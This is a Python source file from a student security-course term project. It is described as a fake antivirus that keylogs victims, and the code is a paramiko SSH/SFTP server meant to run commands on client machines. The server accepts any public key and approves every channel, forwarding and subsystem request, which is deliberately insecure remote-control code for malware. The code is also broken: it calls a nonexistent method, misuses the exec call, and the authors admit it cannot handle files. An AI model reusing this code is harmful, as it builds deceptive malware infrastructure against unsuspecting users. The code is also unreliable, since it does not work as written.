#! /usr/bin/python3
#  ==============================================================================
#   Assignment:  Term Project
#
#       Author:  Radu Cernatescu, Karandeep Ubhi, Kateryna Vaizer
#     Language:  Python3, paramiko
#
#   To Compile:  n/a
#
#        Class:  DPI912 - Python for Programmers: Sockets and Security
#    Professor:  Harvey Kaduri
#     Due Date:  June 28th, 2021 - 12:00 pm
#    Submitted:  June 28th, 2021 - 10:30 am
#
#  -----------------------------------------------------------------------------
#
#  Description:  An app that pretends to be an antivirus and implements
#                keylogging to get the victim's key strokes.
#
#  Collaboration:  Collaboration in a group
#
#        Input:  N/A
#
#       Output:  N/A
#
#    Algorithm: this code demonstrates an attempt to create an SFTP server
#               that is supposed to remotely execute commands on client
#
#   Required Features Not Included:  N/A
#   Known Bugs:  SFTP_Server allows connections, but cannot handle files
#
#  ==============================================================================

import os
import socket
import threading
import paramiko
from paramiko import *


class StubServer (ServerInterface, ):
    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_forward_agent_request(self, channel: Channel):
        return paramiko.OPEN_SUCCEEDED

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

    def check_channel_pty_request(self, channel: Channel,
                                  term: str, width: int, height: int,
                                  pixelwidth: int, pixelheight: int,
                                  modes: str):
        return paramiko.OPEN_SUCCEEDED

    def check_global_request(self, kind: str, msg: Message):
        return paramiko.OPEN_SUCCEEDED

    def get_allowed_auths(self, username):
        return "publickey"

    def check_channel_exec_request(self, channel: Channel, command):
        channel.exec_command(command)
        return True

    def check_channel_subsystem_request(self, channel: Channel, name: str):
        return paramiko.OPEN_SUCCEEDED

    def check_channel_direct_tcpip_request(self, chanid, origin, destination):
        return paramiko.OPEN_SUCCEEDED


class connectionHandler(threading.Thread):
    def __init__(self, connection, address, serverkeyfile):
        threading.Thread.__init__(self)
        self._connection = connection
        self._address = address
        self._serverKeyFile = serverkeyfile

    def run(self):
        serverKey = paramiko.RSAKey.from_private_key_file(self._serverKeyFile)

        transport = paramiko.Transport(self._connection)
        transport.add_server_key(serverKey)

        transport.set_subsystem_handler('sftp', paramiko.SFTPServer)

        server = StubServer()
        transport.startServer(server=server)

        channel = transport.accept()
        while transport.is_active():
            pass


def startServer(host, port, serverKeyFile, backlog=5):
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    serverSocket.bind((host, port))
    serverSocket.listen(backlog)

    while True:
        connection, address = serverSocket.accept()
        serverThread = connectionHandler(connection, address, serverKeyFile)
        serverThread.setDaemon(True)
        serverThread.start()

startServer(host='x.x.x.x', port=22, serverKeyFile='./ufw.txt')
